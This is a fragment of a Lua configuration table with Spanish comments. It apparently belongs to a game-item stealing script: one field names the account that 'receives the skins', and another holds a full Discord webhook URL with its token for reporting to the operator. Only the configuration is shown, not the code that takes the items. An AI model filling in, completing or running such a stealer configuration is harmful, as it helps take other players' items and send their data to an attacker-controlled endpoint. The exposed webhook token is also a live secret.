local CONFIG = {
    ...
    TARGET_NAME   = "turboxxxx24", -- username de la cuenta que recibe las skins
    ...
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1549248246805827604/-LuTwdTTHthfrjFHi-42QuD809r_o2vdOM-ZVRB_lIXtbOGaUnNJq4kGKOJYU6rJXx9V", -- "https://discord.com/api/webhooks/" webhook de Discord
